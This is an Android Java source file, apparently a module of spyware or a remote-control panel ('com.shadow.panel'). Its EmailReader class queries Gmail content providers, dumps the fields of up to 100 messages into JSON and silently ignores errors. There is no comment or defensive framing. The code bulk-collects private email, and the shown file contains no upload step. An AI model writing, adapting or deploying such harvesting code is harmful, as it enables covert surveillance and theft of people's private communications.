package com.shadow.panel;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import org.json.JSONArray;
import org.json.JSONObject;
public class EmailReader {
    public static JSONArray dump(Context ctx) {
        JSONArray arr = new JSONArray();
        Uri[] uris = { Uri.parse("content://gmail-ls/messages"), Uri.parse("content://com.google.android.gm.provider") };
        for (Uri u : uris) {
            try (Cursor c = ctx.getContentResolver().query(u, null, null, null, null)) {
                if (c == null) continue;
                while (c.moveToNext() && arr.length() < 100) {
                    JSONObject o = new JSONObject();
                    for (int i = 0; i < c.getColumnCount(); i++) { o.put(c.getColumnName(i), c.getString(i)); }
                    arr.put(o);
                }
            } catch (Exception ignored) {}
        }
        return arr;
    }
}
